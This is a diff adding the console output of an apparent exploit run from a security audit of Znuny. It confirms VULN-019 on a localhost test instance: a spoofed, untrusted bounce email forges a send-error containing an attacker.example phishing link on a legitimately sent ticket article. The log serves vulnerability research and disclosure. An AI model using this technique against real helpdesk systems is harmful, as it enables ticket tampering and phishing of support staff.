@@ -1,0 +1,12 @@
+/opt/cvehunter/claude_audit/Znuny/exploits/VULN-019/automation.py:38: SyntaxWarning: "\@" is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\@"? A raw string is also an option.
+  "From=>'support\@localhost',To=>'customer\@example.test',Subject=>'your ticket',"
+==========================================================================
+VULN-019: Bounce-detection spoofing bypasses the trusted gate
+Target: http://localhost:25114
+[INFO] DetectBounceEmail.pm injects X-OTRS-Bounce-* after the trust strip; BounceEmail follow-up trusts attacker Message-ID
+==========================================================================
+[SETUP] victim ticket 85, outbound email article 102 with Message-ID <sent-56cff256@localhost>
+[STEP] feeding the synthetic DSN (UNTRUSTED) that bounces the victim article's Message-ID
+[PROOF] forged send-error record on the victim article: [['102', '<sent-56cff256@localhost>', 'ATTACKER-ERROR-56cff256 mailbox full http://attacker.example/phish\\n']]
+[OK] exploit confirmed — a synthetic, untrusted bounce forged a transmission send-error on the legitimately-sent agent article 102 (message_id <sent-56cff256@localhost>) with attacker error text — bounce X-OTRS-Bounce-* is honoured after the trust strip and the follow-up trusts the attacker-supplied original Message-ID.
+==> VULN-019: CONFIRMED — a synthetic, untrusted bounce forged a transmission send-error on the legitimately-sent agent article 102 (message_id <sent-56cff256@localhost>) with attacker error text — bounce X-OTRS-Bounce-* is honoured after the trust strip and the follow-up trusts the attacker-supplied original Message-ID.
